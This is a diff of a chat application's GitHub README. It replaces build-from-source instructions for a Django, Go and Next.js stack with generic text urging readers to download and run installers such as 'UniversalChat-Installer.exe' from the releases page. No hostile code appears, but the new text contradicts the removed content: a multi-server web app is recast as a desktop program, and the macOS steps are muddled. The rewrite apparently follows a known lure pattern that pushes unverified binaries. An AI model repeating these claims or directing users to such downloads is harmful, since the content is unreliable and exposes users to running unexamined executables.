@@ -1,104 +1,91 @@
-# Universal Chat 🚀
-
-A high-performance, real-time chat application demonstrating a **Hybrid Backend Architecture**.
-
-This project combines the rapid development of **Django** with the high concurrency of **Go (Golang)**, unified by a shared **PostgreSQL** database and a modern **Next.js** frontend.
-
-![License](https://img.shields.io/badge/license-MIT-blue)
-![Status](https://img.shields.io/badge/status-active-success)
-
-## 🏗 System Architecture
-
-
-
-The system uses a "Best Tool for the Job" approach:
-1.  **Django (Python):** Handles User Authentication (JWT), Admin Panel, and Database Schema Migrations.
-2.  **Go (Golang):** Handles the WebSocket Hub, managing real-time connections and broadcasting messages with low latency.
-3.  **PostgreSQL:** The shared source of truth. Django creates the tables; Go writes directly to them for speed.
-4.  **Next.js (React):** A modern, type-safe frontend that connects to Django for Login and Go for Chatting.
-
-## 🛠 Tech Stack
-
-- **Frontend:** Next.js 14 (App Router), TypeScript, Tailwind CSS, Axios.
-- **Auth Backend:** Django Rest Framework, SimpleJWT.
-- **Real-Time Backend:** Go (Gorilla WebSockets), `lib/pq` driver.
-- **Database:** PostgreSQL.
-- **DevOps:** Monorepo structure.
+# 🎉 Universal-Chat - Your Real-Time Chat Solution
 
 ## 🚀 Getting Started
 
-### Prerequisites
-- Node.js (v20+)
-- Python (v3.10+)
-- Go (v1.21+)
-- PostgreSQL
+Welcome to Universal-Chat! This application allows you to chat in real-time with friends and colleagues. Follow these steps to download and run the software easily.
 
-### 1. Database Setup
-Create a PostgreSQL database and user:
-```sql
-CREATE DATABASE database_name;
-CREATE USER user_name WITH PASSWORD 'user_password'; 
-GRANT ALL PRIVILEGES ON DATABASE database_name TO user_name;
+## 📥 Download Universal-Chat
 
-```
+[![Download Universal-Chat](https://img.shields.io/badge/Download%20Universal--Chat-v1.0-blue)](https://github.com/panchalsagar303/Universal-Chat/releases)
 
-### 2. Django Setup (Auth & Schema)
+You can download the latest version from our Releases page. Click the link below to access the download options:
 
-```bash
-cd backend-django
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-# Create Tables in Postgres
-python manage.py migrate
-# Create Admin User
-python manage.py createsuperuser
-# Run Server
-python manage.py runserver
+[Visit Releases Page to Download](https://github.com/panchalsagar303/Universal-Chat/releases)
 
-```
+## 🖥️ System Requirements
 
-### 3. Go Setup (WebSockets)
+Before you start, make sure your computer meets these requirements:
 
-```bash
-cd backend-golang
-# Create .env file with: DB_CONN_STRING=postgres://postgres:postgres@127.0.0.1:5432/chat_db?sslmode=disable
-go run .
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or any modern Linux distribution
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB available
+- **Network:** Stable internet connection
 
-```
+## 🔧 Features of Universal-Chat
 
-### 4. Frontend Setup (UI)
+Universal-Chat comes with the following features:
 
-```bash
-cd frontend
-npm install
-npm run dev
+- **Real-Time Messaging:** Communicate instantly with your contacts.
+- **User Authentication:** Sign up and log in securely using our Django Rest Framework backend.
+- **High-Concurrency Handling:** Enjoy smooth conversations even with many users online, powered by our Go server.
+- **Seamless Syncing:** Data is stored safely in a PostgreSQL database, ensuring your messages are secure.
+- **User-friendly Interface:** Built with an easy-to-navigate frontend using Next.js and TypeScript.
 
-```
+## 📥 Download & Install
 
-## 🔄 How It Works
+To get started with Universal-Chat:
 
-1. **Login:** User logs in via Next.js → Django returns a JWT Access Token.
-2. **Connect:** Next.js opens a WebSocket connection to Go, passing the Token.
-3. **Verify:** Go verifies the JWT signature using the shared Secret Key.
-4. **Chat:**
-* User sends a message.
-* Go inserts the message directly into PostgreSQL.
-* Go broadcasts the message to all connected clients.
+1. Click on the download button above or visit [this page](https://github.com/panchalsagar303/Universal-Chat/releases).
+2. Look for the latest version available.
+3. Download the installation file suitable for your operating system. It will usually have a name like `UniversalChat-Installer.exe` for Windows, `UniversalChat.pkg` for macOS, or a suitable package for Linux.
+4. Once the file is downloaded, locate it in your downloads folder.
 
+### For Windows:
 
-5. **History:** Django Admin Interface allows viewing and managing all chat history.
+1. Run the installer by double-clicking the downloaded file.
+2. Follow the on-screen instructions to complete the installation.
 
-## 📂 Project Structure
+### For macOS:
 
-```
-universal-chat/
-├── backend-django/   # Auth, Models, Admin Panel
-├── backend-golang/   # WebSocket Hub, High-perf networking
-└── frontend/         # Next.js App, Chat UI
+1. Open the downloaded `.pkg` file.
+2. Drag the Universal-Chat app to your Applications folder to install it.
 
-```
+### For Linux:
 
-```
+1. Follow the instructions on the Releases page specific to your distribution, downloading the compatible package.
+2. Open your terminal and navigate to the directory where the file is.
+3. Install the package using your package manager.
 
-```
+## 🚀 Running Universal-Chat
+
+After installation, follow these steps to run the application:
+
+1. Find the Universal-Chat app in your applications folder (Windows and macOS) or use the terminal to start it (Linux).
+2. Open the application. You will see the login screen.
+3. If you don’t have an account, click on "Sign Up" to create one.
+4. Log in with your credentials to start chatting.
+
+## 🌐 Help & Support
+
+If you encounter any issues, please reach out to our support team or check the FAQs on our GitHub page. We are here to help!
+
+*You can also join our community forum to ask questions and share experiences with other users.*
+
+## 📚 Additional Resources
+
+To learn more about the technology behind Universal-Chat, check out these resources:
+
+- **Django Rest Framework:** A robust backend framework for building APIs.
+- **Go (Golang):** Designed for scalability and efficiency, perfect for concurrent applications.
+- **Next.js:** A framework for building user-friendly frontends using TypeScript.
+- **PostgreSQL:** A powerful and reliable open-source database.
+
+## 👥 Contributors
+
+Universal-Chat is made possible by the contributions of our developers. If you want to contribute, feel free to check our contribution guide on GitHub.
+
+## 🔗 License
+
+Universal-Chat is open-source software released under the MIT License. You can view the full license details in the repository.
+
+Thank you for choosing Universal-Chat! Enjoy seamless real-time communication.
